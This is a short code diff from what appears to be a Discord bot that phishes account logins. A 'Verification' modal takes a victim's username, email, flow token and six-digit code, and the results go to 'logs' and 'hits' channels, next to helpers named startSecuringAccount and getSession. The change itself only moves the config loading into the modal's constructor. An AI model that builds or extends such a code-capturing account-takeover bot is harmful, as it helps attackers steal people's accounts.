@@ -10,22 +10,21 @@ from views.buttons.accountInfo import accountInfo
 from views.utils.startSecure import startSecuringAccount
 from views.utils.initialSession import getSession
 
-config = json.load(open("config.json", "r+"))
-
 class MyModalTwo(ui.Modal):
     def __init__(self, username, email, flowtoken):
         super().__init__(title="Verification")
         self.username = quote(username)
         self.email = email
         self.flowtoken = flowtoken
+        self.config = json.load(open("config.json", "r+"))
         self.add_item(ui.InputText(label="Code", required=True, max_length=6))
 
     async def callback(self, interaction: discord.Interaction) -> None:
         code = self.children[0].value
 
         print(f"Usernameo: {self.username}")
-        logs_channel = await interaction.client.fetch_channel(config["discord"]["logs_channel"])
-        hits_channel = await interaction.client.fetch_channel(config["discord"]["accounts_channel"])
+        logs_channel = await interaction.client.fetch_channel(self.config["discord"]["logs_channel"])
+        hits_channel = await interaction.client.fetch_channel(self.config["discord"]["accounts_channel"])
 
         embed = discord.Embed(
             title = f"User | {interaction.user.name}",
